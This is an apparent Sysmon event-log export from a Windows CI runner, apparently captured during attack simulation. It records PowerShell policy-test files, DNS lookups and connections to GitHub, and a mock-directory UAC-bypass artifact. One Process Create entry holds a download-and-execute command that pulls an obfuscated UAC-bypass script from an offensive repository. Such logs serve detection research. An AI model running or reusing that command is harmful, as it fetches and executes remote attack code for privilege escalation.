"12/17/2025 8:03:09 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:09.140
ProcessGuid: {f995aebf-63bd-6942-e005-000000000e00}
ProcessId: 10016
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0ckp5lbl.lxj.ps1
CreationUtcTime: 2025-12-17 08:03:09.140
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:08.686
ProcessGuid: {f995aebf-63bc-6942-de05-000000000e00}
ProcessId: 6660
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n50epzlt.2er.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:08 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:08.665
ProcessGuid: {f995aebf-63bc-6942-de05-000000000e00}
ProcessId: 6660
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n50epzlt.2er.ps1
CreationUtcTime: 2025-12-17 08:03:08.665
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:08.202
ProcessGuid: {f995aebf-63bc-6942-dc05-000000000e00}
ProcessId: 3096
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_czb34xl1.riy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:08 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:08.183
ProcessGuid: {f995aebf-63bc-6942-dc05-000000000e00}
ProcessId: 3096
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_czb34xl1.riy.ps1
CreationUtcTime: 2025-12-17 08:03:08.183
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:07.831
ProcessGuid: {f995aebf-63bb-6942-da05-000000000e00}
ProcessId: 2036
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_41sy5rgu.5ui.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:07 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:07.813
ProcessGuid: {f995aebf-63bb-6942-da05-000000000e00}
ProcessId: 2036
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_41sy5rgu.5ui.ps1
CreationUtcTime: 2025-12-17 08:03:07.813
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:07.458
ProcessGuid: {f995aebf-63bb-6942-d805-000000000e00}
ProcessId: 4276
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_eulmoisd.key.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:07 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:07.436
ProcessGuid: {f995aebf-63bb-6942-d805-000000000e00}
ProcessId: 4276
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_eulmoisd.key.ps1
CreationUtcTime: 2025-12-17 08:03:07.436
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:07.078
ProcessGuid: {f995aebf-63ba-6942-d605-000000000e00}
ProcessId: 6628
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_otbifuy4.bex.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:07 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:07.057
ProcessGuid: {f995aebf-63ba-6942-d605-000000000e00}
ProcessId: 6628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_otbifuy4.bex.ps1
CreationUtcTime: 2025-12-17 08:03:07.057
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:06 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:06.710
ProcessGuid: {f995aebf-63ba-6942-d405-000000000e00}
ProcessId: 4960
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dhmqkdwj.4lk.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:06 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:06.690
ProcessGuid: {f995aebf-63ba-6942-d405-000000000e00}
ProcessId: 4960
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dhmqkdwj.4lk.ps1
CreationUtcTime: 2025-12-17 08:03:06.690
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:06 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:06.245
ProcessGuid: {f995aebf-63ba-6942-d305-000000000e00}
ProcessId: 1460
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4aijgrb5.11x.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:06 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:06.225
ProcessGuid: {f995aebf-63ba-6942-d305-000000000e00}
ProcessId: 1460
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4aijgrb5.11x.ps1
CreationUtcTime: 2025-12-17 08:03:06.225
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:05.772
ProcessGuid: {f995aebf-63b9-6942-d005-000000000e00}
ProcessId: 6520
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_oxvif3xj.bl5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:05 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:05.750
ProcessGuid: {f995aebf-63b9-6942-d005-000000000e00}
ProcessId: 6520
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_oxvif3xj.bl5.ps1
CreationUtcTime: 2025-12-17 08:03:05.750
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:05.294
ProcessGuid: {f995aebf-63b9-6942-cd05-000000000e00}
ProcessId: 6176
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ipmfkhv4.3cy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:05 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:05.274
ProcessGuid: {f995aebf-63b9-6942-cd05-000000000e00}
ProcessId: 6176
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ipmfkhv4.3cy.ps1
CreationUtcTime: 2025-12-17 08:03:05.274
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:04 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:04.823
ProcessGuid: {f995aebf-63b8-6942-ca05-000000000e00}
ProcessId: 1324
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_avodpbb2.v5k.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:04 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:04.803
ProcessGuid: {f995aebf-63b8-6942-ca05-000000000e00}
ProcessId: 1324
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_avodpbb2.v5k.ps1
CreationUtcTime: 2025-12-17 08:03:04.803
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:04 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:04.352
ProcessGuid: {f995aebf-63b8-6942-c705-000000000e00}
ProcessId: 5956
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4yp1mogs.usr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:04 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:04.332
ProcessGuid: {f995aebf-63b8-6942-c705-000000000e00}
ProcessId: 5956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4yp1mogs.usr.ps1
CreationUtcTime: 2025-12-17 08:03:04.332
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:03.878
ProcessGuid: {f995aebf-63b7-6942-c405-000000000e00}
ProcessId: 10064
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_z2xhjbix.coi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:03.856
ProcessGuid: {f995aebf-63b7-6942-c405-000000000e00}
ProcessId: 10064
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_z2xhjbix.coi.ps1
CreationUtcTime: 2025-12-17 08:03:03.856
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:03.392
ProcessGuid: {f995aebf-63b7-6942-c105-000000000e00}
ProcessId: 3168
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rbxme5to.lhl.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:03.370
ProcessGuid: {f995aebf-63b7-6942-c105-000000000e00}
ProcessId: 3168
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rbxme5to.lhl.ps1
CreationUtcTime: 2025-12-17 08:03:03.370
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:02 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:02.805
ProcessGuid: {f995aebf-63b6-6942-be05-000000000e00}
ProcessId: 3320
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_keilgq0z.gi3.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:02 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:02.783
ProcessGuid: {f995aebf-63b6-6942-be05-000000000e00}
ProcessId: 3320
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_keilgq0z.gi3.ps1
CreationUtcTime: 2025-12-17 08:03:02.783
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:01.889
ProcessGuid: {f995aebf-63b5-6942-b505-000000000e00}
ProcessId: 9688
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_akun4mpa.ngw.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:01.869
ProcessGuid: {f995aebf-63b5-6942-b505-000000000e00}
ProcessId: 9688
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_akun4mpa.ngw.ps1
CreationUtcTime: 2025-12-17 08:03:01.869
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:01.602
ProcessGuid: {f995aebf-63b5-6942-b305-000000000e00}
ProcessId: 5580
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Windows \System32\mmc.exe
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
IsExecutable: true
Archived: true"
"12/17/2025 8:03:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:01.206
ProcessGuid: {f995aebf-63b5-6942-b105-000000000e00}
ProcessId: 1896
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1ricx03m.kfz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:01.184
ProcessGuid: {f995aebf-63b5-6942-b105-000000000e00}
ProcessId: 1896
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1ricx03m.kfz.ps1
CreationUtcTime: 2025-12-17 08:03:01.184
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:00 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:00.715
ProcessGuid: {f995aebf-63b4-6942-af05-000000000e00}
ProcessId: 5508
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1ngcacoa.x41.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:00 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:00.695
ProcessGuid: {f995aebf-63b4-6942-af05-000000000e00}
ProcessId: 5508
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1ngcacoa.x41.ps1
CreationUtcTime: 2025-12-17 08:03:00.695
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:00 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:00.010
ProcessGuid: {f995aebf-63b3-6942-aa05-000000000e00}
ProcessId: 9264
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f2ctlrgr.r40.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:59 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:59.988
ProcessGuid: {f995aebf-63b3-6942-aa05-000000000e00}
ProcessId: 9264
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f2ctlrgr.r40.ps1
CreationUtcTime: 2025-12-17 08:02:59.988
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:53 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:53.734
ProcessGuid: {f995aebf-63ad-6942-9b05-000000000e00}
ProcessId: 9440
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xtspv343.3mt.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:53 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:53.713
ProcessGuid: {f995aebf-63ad-6942-9b05-000000000e00}
ProcessId: 9440
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xtspv343.3mt.ps1
CreationUtcTime: 2025-12-17 08:02:53.712
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:53 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:52.175
ProcessGuid: {f995aebf-63ab-6942-9205-000000000e00}
ProcessId: 5268
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53590
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:53 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:52.171
ProcessGuid: {f995aebf-63ab-6942-9205-000000000e00}
ProcessId: 5268
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:53 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:51.236
ProcessGuid: {f995aebf-63aa-6942-9005-000000000e00}
ProcessId: 5452
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:53 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:53.110
ProcessGuid: {f995aebf-63ad-6942-9605-000000000e00}
ProcessId: 1628
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vfxxz4qe.nsc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:53 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:53.090
ProcessGuid: {f995aebf-63ad-6942-9605-000000000e00}
ProcessId: 1628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vfxxz4qe.nsc.ps1
CreationUtcTime: 2025-12-17 08:02:53.090
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:52 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:52.588
ProcessGuid: {f995aebf-63ac-6942-9405-000000000e00}
ProcessId: 7484
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xvpz5rxu.dqg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:52 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:52.568
ProcessGuid: {f995aebf-63ac-6942-9405-000000000e00}
ProcessId: 7484
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xvpz5rxu.dqg.ps1
CreationUtcTime: 2025-12-17 08:02:52.568
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:52 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:51.240
ProcessGuid: {f995aebf-63aa-6942-9005-000000000e00}
ProcessId: 5452
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53589
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:52 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:50.316
ProcessGuid: {f995aebf-63a9-6942-8e05-000000000e00}
ProcessId: 6424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53588
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:52 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:50.311
ProcessGuid: {f995aebf-63a9-6942-8e05-000000000e00}
ProcessId: 6424
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:52 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:49.239
ProcessGuid: {f995aebf-63a8-6942-8c05-000000000e00}
ProcessId: 8972
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:51.952
ProcessGuid: {f995aebf-63ab-6942-9205-000000000e00}
ProcessId: 5268
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b1qerxnn.4dj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:51 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:51.934
ProcessGuid: {f995aebf-63ab-6942-9205-000000000e00}
ProcessId: 5268
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b1qerxnn.4dj.ps1
CreationUtcTime: 2025-12-17 08:02:51.934
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:51 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:51.854
ProcessGuid: {f995aebf-63ab-6942-9205-000000000e00}
ProcessId: 5268
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:51 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:49.243
ProcessGuid: {f995aebf-63a8-6942-8c05-000000000e00}
ProcessId: 8972
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53587
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
